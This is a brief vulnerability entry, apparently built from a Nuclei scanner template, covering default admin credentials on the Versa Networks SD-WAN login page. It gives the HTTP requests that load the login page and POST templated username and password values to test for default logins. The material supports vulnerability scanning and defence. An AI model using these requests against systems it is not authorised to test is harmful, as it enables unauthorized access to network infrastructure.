# Vulnerability: Versa Networks SD-WAN Application Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`versa-default-login.yaml`)

## Description
Versa Networks SD-WAN application default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /versa/login.html HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate

POST /versa/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}&sso=systemRadio
```

